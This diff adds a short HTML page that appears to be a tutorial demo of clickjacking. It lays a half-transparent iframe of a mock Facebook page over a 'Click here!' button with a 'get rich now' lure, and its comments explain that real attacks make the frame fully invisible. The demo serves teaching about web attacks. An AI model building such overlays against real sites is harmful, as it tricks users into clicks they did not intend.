@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>The demo</title>
+</head>
+<body>
+  <!-- Here’s how the evil page looks. To make things clear, the <iframe> is half-transparent (in real evil pages it’s fully transparent): -->
+  
+    <style>
+      iframe { /* iframe from the victim site */
+        width: 400px;
+        height: 100px;
+        position: absolute;
+        top:0; left:-20px;
+        opacity: 0.5; /* in real opacity:0 */
+        z-index: 1;
+      }
+      </style>
+      
+      <div>Click to get rich now:</div>
+      
+      <!-- The url from the victim site -->
+      <iframe src="/clickjacking/facebook.html"></iframe>
+      
+      <button>Click here!</button>
+      
+      <div>...And you're cool (I'm a cool hacker actually)!</div>
+      
+</body>
+</html>
